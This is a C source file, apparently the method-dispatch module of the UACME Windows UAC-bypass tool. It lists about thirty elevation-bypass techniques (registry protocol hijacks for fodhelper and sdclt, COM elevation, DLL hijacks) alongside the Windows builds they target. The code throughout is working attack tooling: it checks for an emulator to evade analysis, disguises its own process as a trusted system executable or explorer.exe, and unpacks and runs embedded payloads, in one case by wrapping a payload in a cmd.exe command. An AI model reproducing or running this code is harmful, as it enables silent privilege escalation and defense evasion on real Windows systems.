/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2026
*
*  TITLE:       METHODS.C
*
*  VERSION:     3.71
*
*  DATE:        23 Jul 2026
*
*  UAC bypass dispatch.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

UCM_API(MethodTest);
UCM_API(MethodSXS);
UCM_API(MethodDism);
UCM_API(MethodWow64Logger);
UCM_API(MethodUiAccess);
UCM_API(MethodMsSettings);
UCM_API(MethodTyranid);
UCM_API(MethodJunction);
UCM_API(MethodSXSDccw);
UCM_API(MethodHakril);
UCM_API(MethodCorProfiler);
UCM_API(MethodCMLuaUtil);
UCM_API(MethodDccwCOM);
UCM_API(MethodDirectoryMock);
UCM_API(MethodShellSdctl);
UCM_API(MethodTokenModUIAccess);
UCM_API(MethodEditionUpgradeManager);
UCM_API(MethodDebugObject);
UCM_API(MethodShellChangePk);
UCM_API(MethodNICPoison);
UCM_API(MethodDeprecated);
UCM_API(MethodIeAddOnInstall);
UCM_API(MethodWscActionProtocol);
UCM_API(MethodFwCplLua2);
UCM_API(MethodProtocolHijack);
UCM_API(MethodPca);
UCM_API(MethodCurVer);
UCM_API(MethodMsdt);
UCM_API(MethodDotNetSerial);
UCM_API(MethodVFServerTaskSched);
UCM_API(MethodVFServerDiagProf);
UCM_API(MethodIscsiCpl);
UCM_API(MethodAtlHijack);
UCM_API(MethodSspiDatagram);
UCM_API(MethodRequestTrace);
UCM_API(MethodQuickAssist);
UCM_API(MethodCleanMgrAdmin);
UCM_API(MethodUnifiedConsent);
UCM_API(MethodTabTip);
UCM_API(MethodNarrator);

ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
    UacMethodNICPoison,
    UacMethodIeAddOnInstall,
    UacMethodMsSettingsProtocol,
    UacMethodMsStoreProtocol,
    UacMethodCurVer,
    UacMethodVFServerTaskSched,
    UacMethodVFServerDiagProf,
    UacMethodAtlHijack,
    UacMethodQuickAssist,
    UacMethodCleanMgrAdmin,
    UacMethodUnifiedConsent,
    UacMethodTabTip,
    UacMethodNarrator
};

UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[] = {
    { UacMethodTest,                MethodTest, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { UacMethodDISM,                MethodDism, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { UacMethodUiAccess,            MethodUiAccess, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { UacMethodMsSettings,          MethodMsSettings, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }, // nw
    { UacMethodDiskSilentCleanup,   MethodTyranid, { NT_WIN8_BLUE, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }, //nw
    { UacMethodHakril,              MethodHakril, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, FALSE, TRUE },
    { UacMethodCorProfiler,         MethodCorProfiler, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { UacMethodCMLuaUtil,           MethodCMLuaUtil, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE }, //nw
    { UacMethodDccwCOM,             MethodDccwCOM, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE }, //nw
    { UacMethodShellSdclt,          MethodShellSdctl, { NT_WIN10_REDSTONE1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }, //nw
    { UacMethodDebugObject,         MethodDebugObject, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }, //nw
    { UacMethodShellChangePk,       MethodShellChangePk, { NT_WIN10_REDSTONE1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }, //nw
    { UacMethodMsSettings2,         MethodMsSettings, { NT_WIN10_REDSTONE4, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }, //nw
    { UacMethodNICPoison,           MethodNICPoison, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { UacMethodIeAddOnInstall,      MethodIeAddOnInstall, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { UacMethodMsSettingsProtocol,  MethodProtocolHijack, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE }, //nw
    { UacMethodMsStoreProtocol,     MethodProtocolHijack, { NT_WIN10_REDSTONE5, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE }, //nw
    { UacMethodCurVer,              MethodCurVer, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }, //nw
    { UacMethodNICPoison2,          MethodNICPoison, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { UacMethodMsdt,                MethodMsdt, { NT_WIN10_THRESHOLD1, MAXDWORD }, FUBUKI32_ID, FALSE, FALSE, TRUE },
    { UacMethodVFServerTaskSched,   MethodVFServerTaskSched, { NT_WIN8_BLUE, MAXDWORD}, AKATSUKI_ID, FALSE, TRUE, TRUE },
    { UacMethodVFServerDiagProf,    MethodVFServerDiagProf, { NT_WIN7_RTM, MAXDWORD}, AKATSUKI_ID, FALSE, TRUE, TRUE },
    { UacMethodIscsiCpl,            MethodIscsiCpl, { NT_WIN7_RTM, MAXDWORD }, FUBUKI32_ID, FALSE, FALSE, TRUE },
    { UacMethodAtlHijack,           MethodAtlHijack, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { UacMethodRequestTrace,        MethodRequestTrace, { NT_WIN11_24H2, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { UacMethodQuickAssist,         MethodQuickAssist, { NT_WIN10_REDSTONE5, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { UacMethodCleanMgrAdmin,       MethodCleanMgrAdmin, { NT_WIN10_21H2, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { UacMethodUnifiedConsent,      MethodUnifiedConsent, { NT_WIN10_21H2, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { UacMethodTabTip,              MethodTabTip, { NT_WIN8_BLUE, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { UacMethodNarrator,            MethodNarrator, { NT_WIN10_REDSTONE5, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
};

/*
* MethodsManagerIdExist
*
* Purpose:
*
* Check if method is exist in the given array.
*
*/
BOOL MethodsManagerIdExist(
    _In_reads_(dwCount) const ULONG* pulArray,
    _In_ DWORD dwCount,
    _In_ ULONG ulValue
)
{
    DWORD dwLow = 0, dwHigh, dwMid;

    if (pulArray == NULL || dwCount == 0)
        return FALSE;

    dwHigh = dwCount - 1;

    while (dwLow <= dwHigh) {
        dwMid = dwLow + (dwHigh - dwLow) / 2;

        if (pulArray[dwMid] == ulValue) {
            return TRUE;
        }
        else if (pulArray[dwMid] < ulValue) {
            dwLow = dwMid + 1;
        } else {
            if (dwMid == 0) {
                break;
            }
            dwHigh = dwMid - 1;
        }
    }

    return FALSE;
}

/*
* IsMethodNotImplementedForWin32
*
* Purpose:
*
* Check if method is not implemented in win32 version.
*
*/
__forceinline BOOL IsMethodNotImplementedForWin32(
    _In_ UCM_METHOD Method)
{
    return MethodsManagerIdExist(UCM_WIN32_NOT_IMPLEMENTED,
        RTL_NUMBER_OF(UCM_WIN32_NOT_IMPLEMENTED),
        (ULONG)Method);
}

/*
* MethodsManagerGetMethodById
*
* Purpose:
*
* Return method data by method id.
*
*/
PUCM_API_DISPATCH_ENTRY MethodsManagerGetMethodById(
    _In_reads_(dwCount) const PUCM_API_DISPATCH_ENTRY pEntries,
    _In_ DWORD dwCount,
    _In_ UCM_METHOD Method
)
{
    DWORD dwLow = 0, dwHigh, dwMid;

    if (pEntries == NULL || dwCount == 0)
        return NULL;

    dwHigh = dwCount - 1;

    while (dwLow <= dwHigh) {
        dwMid = dwLow + (dwHigh - dwLow) / 2;

        if (pEntries[dwMid].MethodId == Method) {
            return &pEntries[dwMid];
        }
        else if (pEntries[dwMid].MethodId < Method) {
            dwLow = dwMid + 1;
        }
        else {
            if (dwMid == 0) {
                break;
            }
            dwHigh = dwMid - 1;
        }
    }

    return NULL;
}

/*
* IsMethodMatchRequirements
*
* Purpose:
*
* Check system requirements of the given method.
*
*/
NTSTATUS IsMethodMatchRequirements(
    _In_ PUCM_API_DISPATCH_ENTRY Entry
)
{
#ifdef _DEBUG
    UNREFERENCED_PARAMETER(Entry);
#else
    //
    //  Check Wow64 flags first. Disable this check for debugging build.
    //
    if (g_ctx->IsWow64) {
        if (Entry->DisallowWow64) {
            return STATUS_NOT_SUPPORTED;
        }
    }
#ifdef _WIN64
    else {
        //
        // Not required if Win32.
        //
        if (Entry->Win32OrWow64Required != FALSE) {
            return STATUS_NOT_SUPPORTED;
        }
    }
#endif //_WIN64

    //
    //  Check availability. Disable this check for debugging build.
    //
    if (g_ctx->dwBuildNumber < Entry->Availability.MinumumWindowsBuildRequired) {
        return STATUS_NOT_SUPPORTED;
    }
    if (g_ctx->dwBuildNumber >= Entry->Availability.MinimumExpectedFixedWindowsBuild) {
        return STATUS_NOT_SUPPORTED;
    }
#endif
    return STATUS_SUCCESS;
}

/*
* PostCleanupAttempt
*
* Purpose:
*
* Attempt to cleanup left overs.
*
*/
VOID PostCleanupAttempt(
    _In_ UCM_METHOD Method
)
{
    switch (Method) {

    case UacMethodCorProfiler:
        ucmCorProfilerCleanup();
        break;

    case UacMethodDISM:
    case UacMethodJunction:
        ucmDismMethodCleanup();
        break;

    case UacMethodWow64Logger:
    case UacMethodVFServerDiagProf:
        ucmMethodCleanupSingleItemSystem32(WOW64LOG_DLL, NULL);
        break;

    case UacMethodSXSConsent:
        ucmSXSMethodCleanup();
        break;

    case UacMethodSXSDccw:
        ucmSXSDccwMethodCleanup();
        break;

    case UacMethodHakril:
        ucmHakrilMethodCleanup();
        break;

    case UacMethodIscsiCpl:
        ucmIscsiCplMethodCleanup();
        break;

    case UacMethodAtlHijack:
        ucmMethodCleanupSingleItemSystem32(ATL_DLL, WBEM_DIR);
        break;

    default:
        break;

    }

    ucmConsolePrintValueUlong(TEXT("[+] PostCleanupAttempt for method"), (ULONG)Method, FALSE);
}

/*
* MethodsManagerCall
*
* Purpose:
*
* Run method by method id.
*
*/
NTSTATUS MethodsManagerCall(
    _In_ UCM_METHOD Method
)
{
    BOOL        bParametersBlockSet = FALSE, bMasqueraded = FALSE, bWaitForCompletion = FALSE;
    NTSTATUS    MethodResult, Status;
    ULONG       PayloadSize = 0, DataSize = 0;
    PVOID       PayloadCode = NULL, Resource = NULL;
    PVOID       ImageBaseAddress = g_hInstance;
    
    PUCM_API_DISPATCH_ENTRY Entry;

    UCM_ARGS_BLOCK ArgsBlock;
    UACME_PARAM_BLOCK SharedParams;

    SUP_EXECUTABLE_LIST TrustedAppList;
    SUP_EXECUTABLE_ENTRY *TrustedApp;

    if (wdIsEmulatorPresent3()) {
        return STATUS_NOT_SUPPORTED;
    }

    if (Method >= UacMethodMax) {
        return STATUS_INVALID_PARAMETER;
    }

#ifndef _WIN64
    //
    // Is method implemented for Win32?
    //
    if (IsMethodNotImplementedForWin32(Method)) {
        return STATUS_NOT_SUPPORTED;
    }
#endif //_WIN64

    if (Method != UacMethodTest) {
        // For a COM elevation pick random executable from trusted list.
        RtlSecureZeroMemory(&TrustedAppList, sizeof(TrustedAppList));
        if (supBuildSystemRootExecutableList(&TrustedAppList)) {
            TrustedApp = supSelectRandomExecutable(&TrustedAppList);
            if (TrustedApp) {
                supMasqueradeProcess(FALSE, &TrustedApp->FullPath[TrustedApp->NameOffset]);
                bMasqueraded = TRUE;
            }
            supFreeExecutableList(&TrustedAppList);
        }
        // Fallback to default in case of error.
        if (!bMasqueraded)
            supMasqueradeProcess(FALSE, EXPLORER_EXE);
    }

    Entry = MethodsManagerGetMethodById(ucmMethodsDispatchTable, RTL_NUMBER_OF(ucmMethodsDispatchTable), Method);
    if (Entry == NULL) {
        //
        // Not implemented or deprecated.
        //
        return STATUS_NOT_IMPLEMENTED;
    }

    Status = IsMethodMatchRequirements(Entry);
    if (!NT_SUCCESS(Status))
        return Status;

    ucmConsolePrintValueUlong(TEXT("[+] MethodsManagerCall->Method"), Method, FALSE);
    ucmConsolePrintValueUlong(TEXT("[+] MethodsManagerCall->Entry->PayloadResourceId"), Entry->PayloadResourceId, TRUE);

    if (Entry->PayloadResourceId != PAYLOAD_ID_NONE) {

        Status = supLdrQueryResourceDataEx(
            Entry->PayloadResourceId,
            ImageBaseAddress,
            &DataSize,
            &Resource);

        if (!NT_SUCCESS(Status)) {

            if (Status == STATUS_RESOURCE_TYPE_NOT_FOUND)
                return STATUS_INVALID_IMAGE_FORMAT;

            return Status;
        }

        if (DataSize == 0 || Resource == NULL) {
            return STATUS_INVALID_IMAGE_FORMAT;
        }

        PayloadCode = g_ctx->DecompressRoutine(Entry->PayloadResourceId, Resource, DataSize, &PayloadSize);

        if ((PayloadCode == NULL) || (PayloadSize == 0)) {
            return STATUS_DATA_ERROR;
        }
    }

    ArgsBlock.Method = Method;
    ArgsBlock.PayloadCode = PayloadCode;
    ArgsBlock.PayloadSize = PayloadSize;

    ucmConsolePrintValueUlong(TEXT("[+] MethodsManagerCall->Entry->SetParameters"), Entry->SetParameters, FALSE);

    //
    // Set shared parameters.
    //
    //   1. Execution parameters
    //   2. Optional parameter from Akagi command line.
    //
    if (Entry->SetParameters) {
        RtlSecureZeroMemory(&SharedParams, sizeof(UACME_PARAM_BLOCK));
        bParametersBlockSet = supCreateSharedParametersBlock(g_ctx, Method, &SharedParams);
        ucmConsolePrintValueUlong(TEXT("[+] MethodsManagerCall->supCreateSharedParametersBlock"), bParametersBlockSet, FALSE);

        ucmConsolePrintText(TEXT("[+] SharedParams->szOptionalParameter1"),
            SharedParams.szOptionalParameter1[0] != 0 ? SharedParams.szOptionalParameter1 : TEXT("(empty)"));
        ucmConsolePrintText(TEXT("[+] SharedParams->szOptionalParameter2"),
            SharedParams.szOptionalParameter2[0] != 0 ? SharedParams.szOptionalParameter2 : TEXT("(empty)"));

        bWaitForCompletion = bParametersBlockSet;
    }
    
    MethodResult = Entry->Routine(&ArgsBlock);

    if (PayloadCode) {
        RtlSecureZeroMemory(PayloadCode, PayloadSize);
        supVirtualFree(PayloadCode, NULL);
    }

    //
    // Wait a little bit for completion.
    //
    if (bWaitForCompletion) {
        Status = supWaitForGlobalCompletionEvent();
        ucmConsolePrintStatus(TEXT("[+] MethodsManagerCall->supWaitForGlobalCompletionEvent"), Status);
        supDestroySharedParametersBlock(g_ctx);
    }

    //
    // Perform method-specific cleanup
    //
    PostCleanupAttempt(Method);

    return MethodResult;
}

/************************************************************
**
**
**
** Method table wrappers
**
**
**
************************************************************/

UCM_API(MethodDeprecated)
{
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
}

UCM_API(MethodTest)
{
#ifdef _DEBUG
    return ucmTestRoutine(Parameter->PayloadCode, Parameter->PayloadSize);
#else
    UNREFERENCED_PARAMETER(Parameter);
    return TRUE;
#endif
}

UCM_API(MethodSXS)
{
    return ucmSXSMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize,
        NULL,
        CONSENT_EXE,
        MSCONFIG_EXE,
        TRUE);
}

UCM_API(MethodDism)
{
    return ucmDismMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodWow64Logger)
{
    //
    //  Required x64 as this method abuse wow64 logger mechanism
    //
#ifdef _WIN64
    return ucmWow64LoggerMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
#else
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#endif
}

UCM_API(MethodUiAccess)
{
    return ucmUiAccessMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodMsSettings)
{
    LPWSTR lpszPayload = NULL;
    LPWSTR lpszTargetApp = NULL;

    WCHAR szTargetApp[MAX_PATH * 2];

    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    if (Parameter->Method == UacMethodMsSettings2)
        lpszTargetApp = COMPUTERDEFAULTS_EXE;
    else
        lpszTargetApp = FODHELPER_EXE;

    _strcpy(szTargetApp, g_ctx->szSystemDirectory);
    _strcat(szTargetApp, lpszTargetApp);

    return ucmShellRegModMethod(Parameter->Method,
        T_MSSETTINGS,
        szTargetApp,
        lpszPayload);
}

UCM_API(MethodTyranid)
{
    LPWSTR lpszPayload = NULL;

    UNREFERENCED_PARAMETER(Parameter);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    return ucmDiskCleanupEnvironmentVariable(lpszPayload);
}

UCM_API(MethodJunction)
{
    return ucmJunctionMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodSXSDccw)
{
    return ucmSXSDccwMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodHakril)
{
    return ucmHakrilMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodCorProfiler)
{
    return ucmCorProfilerMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodCMLuaUtil)
{
    LPWSTR lpszParameter;

    UNREFERENCED_PARAMETER(Parameter);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        lpszParameter = g_ctx->szDefaultPayload;
    else
        lpszParameter = g_ctx->szOptionalParameter;

    return ucmCMLuaUtilShellExecMethod(lpszParameter);
}

UCM_API(MethodDccwCOM)
{
    LPWSTR lpszPayload = NULL;

    UNREFERENCED_PARAMETER(Parameter);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    return ucmDccwCOMMethod(lpszPayload);
}

UCM_API(MethodDirectoryMock)
{
    return ucmDirectoryMockMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodShellSdctl)
{
    LPWSTR Payload = NULL;

    if (g_ctx->OptionalParameterLength == 0)
        Payload = g_ctx->szDefaultPayload;
    else
        Payload = g_ctx->szOptionalParameter;

    return ucmShellRegModMethod(Parameter->Method,
        T_CLASSESFOLDER,
        SDCLT_EXE,
        Payload);
}

UCM_API(MethodTokenModUIAccess)
{
    if (Parameter->Method == UacMethodTokenModUiAccess) {
        return ucmTokenModUIAccessMethod(Parameter->PayloadCode,
            Parameter->PayloadSize);
    }
    else {
        return ucmTokenModUIAccessMethod2(Parameter->PayloadCode,
            Parameter->PayloadSize);
    }
}

UCM_API(MethodEditionUpgradeManager)
{
#ifndef _WIN64
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#else
    return ucmEditionUpgradeManagerMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
#endif
}

UCM_API(MethodDebugObject)
{
    LPWSTR lpszPayload = NULL;
    UNREFERENCED_PARAMETER(Parameter);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    return ucmDebugObjectMethod(lpszPayload);
}

UCM_API(MethodShellChangePk)
{
    LPWSTR lpszPayload = NULL;

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    return ucmShellRegModMethod(Parameter->Method,
        T_LAUNCHERSYSTEMSETTINGS,
        SLUI_EXE,
        lpszPayload);
}

UCM_API(MethodNICPoison)
{
#ifndef _WIN64
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#else
    if (Parameter->Method == UacMethodNICPoison) {

        return ucmNICPoisonMethod(
            Parameter->PayloadCode,
            Parameter->PayloadSize);

    }
    else if (Parameter->Method == UacMethodNICPoison2) {

        return ucmNICPoisonMethod2(
            Parameter->PayloadCode,
            Parameter->PayloadSize);

    }
    else 
        return STATUS_NOT_SUPPORTED;
#endif
}

UCM_API(MethodIeAddOnInstall)
{
#ifdef _WIN64
    return ucmIeAddOnInstallMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
#else
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#endif
}

UCM_API(MethodWscActionProtocol)
{
    LPWSTR lpszPayload = NULL;

    UNREFERENCED_PARAMETER(Parameter);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    return ucmWscActionProtocolMethod(lpszPayload);
}

UCM_API(MethodFwCplLua2)
{
    LPWSTR lpszPayload = NULL;

    UNREFERENCED_PARAMETER(Parameter);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    return ucmFwCplLuaMethod2(lpszPayload);
}

UCM_API(MethodProtocolHijack)
{
    NTSTATUS Result = STATUS_ACCESS_DENIED;
    LPWSTR PayloadParameter = NULL, PayloadFinal = NULL;
    SIZE_T Size;

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        PayloadParameter = g_ctx->szDefaultPayload;
    else
        PayloadParameter = g_ctx->szOptionalParameter;

    switch (Parameter->Method) {
    
    case UacMethodMsSettingsProtocol:
        Result = ucmMsSettingsProtocolMethod(PayloadParameter);
        break;
    
    case UacMethodMsStoreProtocol:

        Size = ((MAX_PATH * 2) + _strlen(PayloadParameter)) * sizeof(WCHAR);
        PayloadFinal = supHeapAlloc(Size);
        if (PayloadFinal) {

            _strcpy(PayloadFinal, g_ctx->szSystemDirectory);
            _strcat(PayloadFinal, CMD_EXE);
            _strcat(PayloadFinal, RUN_CMD_COMMAND);
            _strcat(PayloadFinal, PayloadParameter);
            Result = ucmMsStoreProtocolMethod(PayloadFinal);
            supHeapFree(PayloadFinal);
        }
        break;

    }

    return Result;
}

UCM_API(MethodPca)
{
#ifndef _WIN64
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#else
    return ucmPcaMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
#endif
}

UCM_API(MethodCurVer)
{
    UNREFERENCED_PARAMETER(Parameter);
#ifndef _WIN64
    return STATUS_NOT_SUPPORTED;
#else
    LPWSTR lpszPayload = NULL;
    LPWSTR lpszTargetApp = NULL;

    WCHAR szTargetApp[MAX_PATH * 2];

    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    lpszTargetApp = FODHELPER_EXE;
    _strcpy(szTargetApp, g_ctx->szSystemDirectory);
    _strcat(szTargetApp, lpszTargetApp);

    return ucmShellRegModMethod3(T_MSSETTINGS,
        szTargetApp,
        lpszPayload);

#endif
}

UCM_API(MethodMsdt)
{
    return ucmMsdtMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodDotNetSerial)
{
    LPWSTR lpszPayload = NULL;

    UNREFERENCED_PARAMETER(Parameter);

    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    return ucmDotNetSerialMethod(lpszPayload);
}

UCM_API(MethodVFServerTaskSched)
{
    return ucmVFServerTaskSchedMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodVFServerDiagProf)
{
    return ucmVFServerDiagProfileMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodIscsiCpl)
{
    return ucmIscsiCplMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodAtlHijack)
{
#ifdef _WIN64
    return ucmAtlHijackMethod(MMC_EXE,
        ATL_DLL,
        Parameter->PayloadCode,
        Parameter->PayloadSize);
#else
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#endif
}

UCM_API(MethodSspiDatagram)
{
#ifdef _WIN64
    return ucmSspiDatagramMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
#else
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#endif
}

UCM_API(MethodRequestTrace)
{
#ifdef _WIN64
    return ucmRequestTraceMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
#else
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#endif
}

UCM_API(MethodUnifiedConsent)
{
#ifdef _WIN64
    return ucmUnifiedConsentMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
#else
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#endif
}

UCM_API(MethodQuickAssist)
{
#ifdef _WIN64
    return ucmQuickAssistMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
#else
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#endif
}

UCM_API(MethodCleanMgrAdmin)
{
#ifdef _WIN64
    return ucmCleanMgrAdminMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
#else
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#endif
}

UCM_API(MethodTabTip)
{
#ifdef _WIN64
    return ucmTabTipMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
#else
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#endif
}

UCM_API(MethodNarrator)
{
#ifdef _WIN64
    return ucmNarratorMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
#else
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#endif
}
